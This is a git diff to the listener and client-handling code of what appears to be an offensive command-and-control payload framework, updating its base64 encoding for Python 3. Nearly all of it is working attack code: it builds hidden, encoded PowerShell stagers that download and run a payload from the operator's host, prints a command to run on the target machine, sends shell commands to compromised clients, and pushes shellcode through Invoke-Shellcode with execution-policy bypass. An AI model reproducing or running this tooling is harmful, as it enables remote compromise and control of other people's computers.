@@ -1,6 +1,7 @@
 from lib.main import *
 from lib.menu import *
 from prompt_toolkit.contrib.completers import WordCompleter
+import base64
 
 history = prompt_toolkit.history.InMemoryHistory()
 
@@ -46,9 +47,15 @@ def printListener(printit=True, returnit=False):
 
     FUNCTIONS().DoServe(returnIP(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
     #stagerexec = 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + returnIP() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
-    #Fixing encoding
+    #Fixing byte encoding issue. removing utf_16_le encoding
+    #stg_string = ("IEX (New-Object Net.Webclient).DownloadString('http://" + returnIP() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')")
+    #Encoding stager payload
+    #stagerexec = 'powershell -w hidden -noni -enc ' + base64.b64encode(bytes(stg_string, 'utf_16_le')).decode("utf-8")
+
     stagerexec = 'powershell -w hidden -noni -enc ' + base64.b64encode(("IEX (New-Object Net.Webclient).DownloadString('http://" + returnIP() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le')).decode()
 
+    #stagerexec = encode(stg_string, 'utf_16_le').encode('base64').replace('\n','')
+    #print("", encoding=blah)
     if printit:
         print(t.bold_green + '[!] Run this on target machine...' + t.normal + '\n\n' + stagerexec + '\n')
 
@@ -89,8 +96,9 @@ def interactShell(clientnumber):
                     if command == "":
                         server.handlers[clientnumber].out_buffer.append('{"type":"", "data":"", "sendoutput":""}')
                     else:
+                        #Fixed encoding
                         json = '{"type":"exec", "data":"%s", "sendoutput":"true"}'% (base64.b64encode(command.encode('UTF_16_le'))).decode()
-                        server.handlers[clientnumber].out_buffer.append(json)
+                        server.handlers[clientnumber].out_buffer.append(json.encode())
                         while not server.handlers[clientnumber].in_buffer:
                             time.sleep(0.01)
                         print(server.handlers[clientnumber].in_buffer.pop())
@@ -155,22 +163,25 @@ def clientUpload(powershellExec, isExe, json):
     if clientnumber:
         if isExe:
             newpayloadlayout = FUNCTIONS().powershellShellcodeLayout(powershellExec)
+            print("newpayloadlayout ",newpayloadlayout)
             moduleport = FUNCTIONS().randomUnusedPort()
             FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
             encPowershell = getSandboxScripts('powershell')
             encPowershell += "IEX(New-Object Net.WebClient).DownloadString('http://%s:%s/Invoke-Shellcode.ps1');Start-Sleep 30;Invoke-Code -Force -Shellcode @(%s)"%(returnIP(), moduleport, newpayloadlayout.rstrip(','))
-            encPowershell = base64.b64encode(encPowershell.encode('UTF-16LE'))
+            encPowershell = base64.b64encode(encPowershell.encode('UTF-16LE')).decode()
             fullExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if($Arch -eq 'x86'){powershell -exec bypass -enc \"%s\"}elseif($Arch -eq 'amd64'){$powershell86 = $env:windir + '\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)
-            b64Exec = base64.b64encode(fullExec.encode('UTF-16LE'))
+            b64Exec = base64.b64encode(fullExec.encode('UTF-16LE')).decode() #Temp fix
+            print(b64Exec)
             lenb64 = len(b64Exec)
         else:
-            b64Exec = base64.b64encode(powershellExec.encode('UTF-16LE'))
+            b64Exec = base64.b64encode(powershellExec.encode('UTF-16LE')).decode()
             lenb64 = len(b64Exec)
 
 
-        splitPayoad = checkPayloadLength(b64Exec)
+        splitPayoad = checkPayloadLength(b64Exec)   
 
         if splitPayoad:
+            print("WE HAVE SPLIT THE ASSHOLE")
             for p in splitPayoad:
                 for server in serverlist:
                     if clientnumber in list(server.handlers.keys()):
